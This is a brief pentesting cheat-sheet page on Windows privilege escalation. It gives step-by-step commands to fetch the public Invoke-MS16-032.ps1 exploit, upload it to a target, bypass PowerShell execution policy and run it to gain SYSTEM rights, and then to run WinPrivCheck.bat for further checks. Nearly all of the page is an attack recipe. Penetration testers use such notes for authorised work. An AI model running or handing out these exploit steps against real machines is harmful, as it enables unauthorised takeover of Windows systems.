---
layout: page
title: win priv esc
description:
img: assets/img/pentest/h4Ck/mixNumbers.png
importance: 2
category: pentesting
tag: pentesting
discus_comments: true
comments: true
toc:
  sidebar: left
related_posts: true
news: true
---

# Windows Privilege Escalation

## Exploit ms16_032

wget [Invoke-MS16-032.ps1](https://github.com/kitsun3sec/Pentest-Cheat-Sheets/tree/master/CheatSheets/windows/priv_esc/Invoke-MS16-032.ps1)

#### Upload it to the target and through the powershell command line execute:

```bash
> powershell -ExecutionPolicy Bypass
> Import-Module .\Invoke-MS16-032.ps1
> Invoke-MS16-032
```

##### Done, if everything worked fine, you're now system user.

## WinPrivCheck.bat

##### Upload it to the target and run through terminal

```cmd
WinPrivCheck.bat
```
